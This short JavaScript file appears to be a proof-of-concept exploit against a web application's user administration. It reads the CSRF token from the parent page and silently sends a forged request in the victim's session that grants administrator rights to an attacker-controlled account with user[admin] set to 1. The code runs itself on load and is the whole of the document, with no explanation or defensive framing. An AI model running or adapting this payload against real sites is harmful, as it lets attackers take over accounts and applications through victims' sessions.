const csrf = window.parent.document
  .querySelector('meta[name="csrf-token"]')
  ?.getAttribute("content");

async function escalatePrivileges() {
  console.log("Attempting to escalate privileges...");
  if (!csrf) {
    throw new Error("CSRF token not found");
  }

  const body = new URLSearchParams({
    _method: "put",
    authenticity_token: csrf,
    "user[login]": "attacker@example.net",
    "user[firstname]": "attacker",
    "user[lastname]": "attacker",
    "user[mail]": "attacker@example.net",
    "user[language]": "en",
    "user[admin]": "1",
    "user[password]": "",
    "user[password_confirmation]": "",
    send_information: "1",
    "user[force_password_change]": "0",
    "pref[time_zone]": "Etc/UTC",
    "pref[theme]": "light",
    "pref[disable_keyboard_shortcuts]": "0",
    button: "",
  });

  await fetch(`/users/13`, {
    method: "POST",
    credentials: "include", 
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    },
    body: body.toString(),
  });
}

escalatePrivileges();



